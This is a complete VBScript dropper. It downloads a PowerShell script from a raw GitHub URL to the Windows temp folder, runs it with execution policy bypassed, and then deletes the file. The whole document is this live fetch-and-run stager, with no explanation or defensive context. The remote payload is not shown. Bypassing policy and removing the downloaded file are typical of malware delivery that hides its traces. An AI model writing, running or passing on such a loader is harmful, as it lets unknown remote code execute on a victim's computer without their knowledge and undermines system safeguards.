Set shell = CreateObject("WScript.Shell")

url = "https://raw.githubusercontent.com/helptapreview-rgb/asdasd/refs/heads/main/dt.ps1"
file = shell.ExpandEnvironmentStrings("%TEMP%") & "\dt.ps1"

shell.Run "powershell.exe -NoProfile -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & file & "'""", 1, True

If CreateObject("Scripting.FileSystemObject").FileExists(file) Then
    shell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & file & """", 1, True
    CreateObject("Scripting.FileSystemObject").DeleteFile file, True
End If
